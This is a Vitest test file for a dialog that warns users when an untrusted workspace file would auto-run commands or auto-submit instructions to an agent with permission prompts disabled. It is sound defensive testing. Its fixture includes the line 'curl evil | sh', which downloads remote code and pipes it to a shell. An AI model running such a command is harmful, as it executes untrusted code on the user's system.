import { describe, expect, it } from 'vitest'
import { reviewDialogText } from './workspace-files-dialog'

const review = {
  path: '/w/lanes/untrusted.clave',
  folder: '/w/lanes',
  autoCommands: ['npm run dev', 'curl evil | sh'],
  prompts: ['UNTRUSTED-BRIEF   do the\n  thing', 'x'.repeat(200)],
  dangerous: true
}

describe('the review dialog text', () => {
  it('names the file and the folder, and discloses everything that would act', () => {
    const text = reviewDialogText(review)
    expect(text.message).toBe('“untrusted.clave” wants to run content automatically.')
    expect(text.checkboxLabel).toBe('Trust all workspace files in “lanes”')
    expect(text.buttons).toEqual(['Open safely', 'Trust and run', 'Cancel'])
    expect(text.detail).toContain('Commands that would run automatically:')
    expect(text.detail).toContain('  • npm run dev')
    expect(text.detail).toContain('  • curl evil | sh')
    expect(text.detail).toContain('Instructions that would be auto-submitted to an agent:')
    // Whitespace flattened, a long prompt cut with an ellipsis.
    expect(text.detail).toContain('  • UNTRUSTED-BRIEF do the thing')
    expect(text.detail).toContain('  • ' + 'x'.repeat(117) + '…')
    expect(text.detail).toContain('permission prompts disabled (--dangerously-skip-permissions)')
    expect(text.detail).toMatch(/Only trust this file if you recognise/)
  })

  it('says only what applies', () => {
    const text = reviewDialogText({ ...review, autoCommands: [], dangerous: false })
    expect(text.detail).not.toContain('Commands that would run')
    expect(text.detail).not.toContain('permission prompts disabled')
    expect(text.detail).toContain('Instructions that would be auto-submitted')
  })
})
